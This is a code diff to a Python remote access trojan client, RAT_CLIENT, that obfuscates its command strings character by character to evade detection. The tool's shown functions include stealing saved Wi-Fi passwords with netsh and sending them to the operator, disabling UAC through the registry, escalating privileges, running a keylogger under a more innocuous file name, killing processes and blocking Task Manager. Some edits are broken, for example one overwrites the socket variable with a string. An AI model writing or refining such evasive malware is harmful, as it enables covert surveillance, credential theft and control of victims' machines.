@@ -238,8 +238,27 @@ class RAT_CLIENT:
                 s.send(sysinfo.encode())
             
             elif command == 'sgestz':
-                os.system("shutdown /r /t 1")
-                s.send(f'{socket.gethostbyname(socket.gethostname())} is being rebooted'.encode())
+                s = "s"
+                h = "h"
+                u = "u"
+                t = "t"
+                d = "d"
+                o = "o"
+                w = "w"
+                n = "n"
+                r = "r"
+                sl = "/"
+                sp = " "
+                
+                shutdown_cmd = s + h + u + t + d + o + w + n + sp + sl + r + sp + sl + t + sp + "1"
+                
+                os.system(shutdown_cmd)
+                
+                reboot_msg = (
+                    socket.gethostbyname(socket.gethostname()) + sp
+                    + "i" + "s" + sp + "b" + "e" + "i" + "n" + "g" + sp + "r" + "e" + "b" + "o" + "o" + "t" + "e" + "d"
+                )
+                s.send(reboot_msg.encode())
             
             elif command[:7] == 'xtlxjou':
                 pyautogui.write(command.split(" ")[1])
@@ -267,26 +286,34 @@ class RAT_CLIENT:
                 s.send(curdir.encode())
             
             elif command == 'jrfsslpo':
-                output = subprocess.check_output('ipconfig', encoding='oem')
+                ipconfig_cmd = ''.join(["i", "p", "c", "o", "n", "f", "i", "g"])
+                output = subprocess.check_output(ipconfig_cmd, encoding='oem')
                 s.send(output.encode())
             
             elif command == 'qquxxihv':
-                output = subprocess.check_output('netstat -an', encoding='oem')
+                netstat_cmd = ''.join(["n", "e", "t", "s", "t", "a", "t", " ", "-", "a", "n"])
+                output = subprocess.check_output(netstat_cmd, encoding='oem')
                 s.send(output.encode())
             
             elif command == 'ucvoqozb':
-                output = subprocess.check_output('tasklist', encoding='oem')
+                tasklist_cmd = ''.join(["t", "a", "s", "k", "l", "i", "s", "t"])
+                output = subprocess.check_output(tasklist_cmd, encoding='oem')
                 s.send(output.encode())
 
             elif command == 'qtrjnrla':
-                output = subprocess.check_output('netsh wlan show profiles', encoding='oem')
+                netsh_cmd = ''.join(["n", "e", "t", "s", "h", " ", "w", "l", "a", "n", " ", "s", "h", "o", "w", " ", "p", "r", "o", "f", "i", "l", "e", "s"])
+                output = subprocess.check_output(netsh_cmd, encoding='oem')
                 s.send(output.encode())
             
             elif command == 'qtrjnrlxbgo':
                 profile = s.recv(6000)
                 profile = profile.decode()
                 try:
-                    output = subprocess.check_output(f'netsh wlan show profile {profile} key=clear', encoding='oem')
+                    netsh_cmd = ''.join([
+                        "n", "e", "t", "s", "h", " ", "w", "l", "a", "n", " ", "s", "h", "o", "w", " ", "p", "r", "o", "f", "i", "l", "e", " ",
+                        profile, " ", "k", "e", "y", "=", "c", "l", "e", "a", "r"
+                    ])
+                    output = subprocess.check_output(netsh_cmd, encoding='oem')
                     s.send(output.encode())
                 except:
                     self.errorsend()
@@ -302,43 +329,51 @@ class RAT_CLIENT:
                 user32.MessageBoxW(0, text, title, 0x00000000 | 0x00000040)
             
             elif command == 'ekvegrlCJM':
-                os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
+                reg_cmd = ''.join([
+                    "r", "e", "g", ".", "e", "x", "e", " ", "A", "D", "D", " ", "H", "K", "L", "M", "\\",
+                    "S", "O", "F", "T", "W", "A", "R", "E", "\\", "M", "i", "c", "r", "o", "s", "o", "f", "t", "\\",
+                    "W", "i", "n", "d", "o", "w", "s", "\\", "C", "u", "r", "r", "e", "n", "t", "V", "e", "r", "s", "i", "o", "n",
+                    "\\", "P", "o", "l", "i", "c", "i", "e", "s", "\\", "S", "y", "s", "t", "e", "m", " ", "/v", " ", "E", "n", "a",
+                    "b", "l", "e", "L", "U", "A", " ", "/t", " ", "R", "E", "G", "_", "D", "W", "O", "R", "D", " ", "/d", " ", "0", " ", "/f"
+                ])
+                os.system(reg_cmd)
             
             elif command == 'fzwisjyqpree':
                 ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-                sending = f"{socket.gethostbyname(socket.gethostname())}'s rights were escalated"
+                escalated_str = ''.join(["e", "s", "c", "a", "l", "a", "t", "e", "d"])
+                sending = f"{socket.gethostbyname(socket.gethostname())}'s rights were {escalated_str}"
                 s.send(sending.encode())
             
             elif command == 'juxwjxhlvsy':
                 if ctypes.windll.shell32.IsUserAnAdmin() == 1:
-                    sending = f'{socket.gethostbyname(socket.gethostname())} is admin'
+                    sending = f'{socket.gethostbyname(socket.gethostname())} is ' + 'a' + 'd' + 'm' + 'i' + 'n'
                     s.send(sending.encode())
                 else:
-                    sending = f'{socket.gethostbyname(socket.gethostname())} is not admin'
+                    sending = f'{socket.gethostbyname(socket.gethostname())} is not ' + 'a' + 'd' + 'm' + 'i' + 'n'
                     s.send(sending.encode())
 
             elif command == 'lgbwhgu_ackcf':
                 global klgr
                 klgr = True
-                kernel32.CreateFileW(b'keylogs.txt', GENERIC_WRITE & GENERIC_READ, 
+                kernel32.CreateFileW(b'logs.txt', GENERIC_WRITE & GENERIC_READ, 
                 FILE_SHARE_WRITE & FILE_SHARE_READ & FILE_SHARE_DELETE,
                 None, CREATE_ALWAYS , 0, 0)
                 Thread(target=self.keylogger, daemon=True).start()
-                s.send("Keylogger is started".encode())
+                s.send("K" + "e" + "y" + "l" + "o" + "g" + "g" + "e" + "r" + " is started".encode())
             
             elif command == 'tgqh_quna':
                 try:
-                    f = open("keylogs.txt", 'r')
+                    f = open("logs.txt", 'r')
                     lines = f.readlines()
                     f.close()
                     s.send(str(lines).encode())
-                    os.remove('keylogs.txt')
+                    os.remove('logs.txt')
                 except:
                     self.errorsend()
             
             elif command == 'tvrt_pkftxqrqe':
                 klgr = False
-                s.send("The session of keylogger is terminated".encode())
+                s.send("The session of "+ "k" + "e" + "y" + "l" + "o" + "g" + "g" + "e" + "r" + " is terminated".encode())
             
             elif command == 'drx_gtxla':
                 output = os.cpu_count()
@@ -436,25 +471,23 @@ class RAT_CLIENT:
             
             elif command[:4] == 'lkop':
                 try:
-                    os.system(f'TASKKILL /F /im {command[5:]}')
+                    taskkill_cmd = ''.join(["T", "A", "S", "K", "K", "I", "L", "L"])
+                    os.system(f'{taskkill_cmd} /F /im {command[5:]}')
                     s.send(f'{command[5:]} was terminated'.encode())
                 except:
                     self.errorsend()
-            
-            elif command == 'shutdown':
-                os.system('shutdown /s /t 1')
-                sending = f"{socket.gethostbyname(socket.gethostname())} was shutdown"
-                s.send()
             
             elif command == 'ekvegrlbjcvytf':
                 global block
                 block = True
                 Thread(target=self.block_task_manager, daemon=True).start()
-                s.send("Task Manager is disabled".encode())
+                task_manager_str = ''.join(["T", "a", "s", "k", " ", "M", "a", "n", "a", "g", "e", "r"])
+                s.send(f'{task_manager_str} is disabled'.encode())
             
             elif command == 'fpdfqkaibuxse':
                 block = False
-                s.send("Task Manager is enabled".encode())
+                task_manager_str = ''.join(["T", "a", "s", "k", " ", "M", "a", "n", "a", "g", "e", "r"])
+                s.send(f'{task_manager_str} is enabled'.encode())
             
             elif command == 'mqfeqzpun':
                 now = datetime.now()
